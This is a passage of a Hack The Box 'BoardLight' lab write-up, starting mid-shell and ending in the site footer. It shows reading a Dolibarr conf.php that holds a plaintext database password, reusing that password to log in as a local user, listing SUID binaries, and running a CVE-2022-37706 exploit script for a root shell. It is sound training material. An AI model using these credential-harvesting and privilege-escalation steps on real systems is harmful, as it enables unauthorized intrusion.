2&gt; /dev/null</span><br><span class="line">find . -name *conf.* 2&gt; /dev/null</span><br><span class="line">./crm.board.htb/nightwatch.conf.js</span><br><span class="line">./crm.board.htb/htdocs/includes/ace/src/snippets/apache_conf.js</span><br><span class="line">./crm.board.htb/htdocs/includes/ace/src/mode-apache_conf.js</span><br><span class="line">./crm.board.htb/htdocs/core/class/conf.class.php</span><br><span class="line">./crm.board.htb/htdocs/install/fileconf.php</span><br><span class="line">./crm.board.htb/htdocs/conf/conf.php.old</span><br><span class="line">./crm.board.htb/htdocs/conf/conf.php.example</span><br><span class="line">./crm.board.htb/htdocs/conf/conf.php</span><br><span class="line">www-data@boardlight:~/html$ <span class="built_in">cat</span> ./crm.board.htb/htdocs/conf/conf.php</span><br><span class="line"><span class="built_in">cat</span> ./crm.board.htb/htdocs/conf/conf.php</span><br><span class="line">&lt;?php</span><br><span class="line">//</span><br><span class="line">// File generated by Dolibarr installer 17.0.0 on May 13, 2024</span><br><span class="line">//</span><br><span class="line">// Take a look at conf.php.example file <span class="keyword">for</span> an example of conf.php file</span><br><span class="line">// and explanations <span class="keyword">for</span> all possibles parameters.</span><br><span class="line">//</span><br><span class="line"><span class="variable">$dolibarr_main_url_root</span>=<span class="string">&#x27;http://crm.board.htb&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_document_root</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_url_root_alt</span>=<span class="string">&#x27;/custom&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_document_root_alt</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_data_root</span>=<span class="string">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_name</span>=<span class="string">&#x27;dolibarr&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_prefix</span>=<span class="string">&#x27;llx_&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_user</span>=<span class="string">&#x27;dolibarrowner&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_pass</span>=<span class="string">&#x27;serverfun2$2023!!&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_type</span>=<span class="string">&#x27;mysqli&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_character_set</span>=<span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$dolibarr_main_db_collation</span>=<span class="string">&#x27;utf8_unicode_ci&#x27;</span>;</span><br><span class="line">// Authentication settings</span><br><span class="line"><span class="variable">$dolibarr_main_authentication</span>=<span class="string">&#x27;dolibarr&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking also at our <code>/home</code> directory, we find a user <code>larissa</code>, we try the <code>serverfun2$2023!!</code> password on her and we get our <code>user.txt</code> flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">larissa@boardlight:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(larissa) gid=1000(larissa) <span class="built_in">groups</span>=1000(larissa),4(adm)</span><br><span class="line">larissa@boardlight:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">3ae390e6867d32******************</span><br><span class="line">larissa@boardlight:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-CVE-2022-37706"><a href="#Privilege-Escalation-CVE-2022-37706" class="headerlink" title="Privilege Escalation - CVE-2022-37706"></a>Privilege Escalation - CVE-2022-37706</h3><p>Checking our <a class="link"   target="_blank" rel="noopener" href="https://www.linux.com/training-tutorials/what-suid-and-how-set-suid-linuxunix/" >SUID <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> permissions on files, we find something interesting:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">larissa@boardlight:~$ find / -perm -4000 2&gt; /dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">larissa@boardlight:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see something intersting which is <a class="link"   target="_blank" rel="noopener" href="https://www.enlightenment.org/" >Enlightenment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> that is a windows manager for linux.<br>Looking for known exploits for it, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706" >CVE-2022-37706 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is an exploit that allows local users to obtain root privileges by exploiting enlightenment_sys in Englightenment:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">larissa@boardlight:/tmp$ ./exploit.sh</span><br><span class="line">CVE-2022-37706</span><br><span class="line">[*] Trying to find the vulnerable SUID file...</span><br><span class="line">[*] This may take few seconds...</span><br><span class="line">[+] Vulnerable SUID binary found!</span><br><span class="line">[+] Trying to pop a root shell!</span><br><span class="line">[+] Enjoy the root shell :)</span><br><span class="line">mount: /dev/../tmp/: can<span class="string">&#x27;t find in /etc/fstab.</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)</span></span><br><span class="line"><span class="string"># cat /root/root.txt</span></span><br><span class="line"><span class="string">b95c0c23a589d6******************</span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our root flag. It was a fairly short writeup since it was a straight forward machine. See you in future writeups :)</p>
+<p>With love, 0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: BoardLight</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-09-27 21:04:50</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-27 23:14:27
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/09/27/Hackthebox-BoardLight/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/09/19/Hackthebox-SolarLab/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: SolarLab</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: BoardLight</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-crm-board-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;crm.board.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-CVE-2022-37706"><span class="nav-text">Privilege Escalation - CVE-2022-37706</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
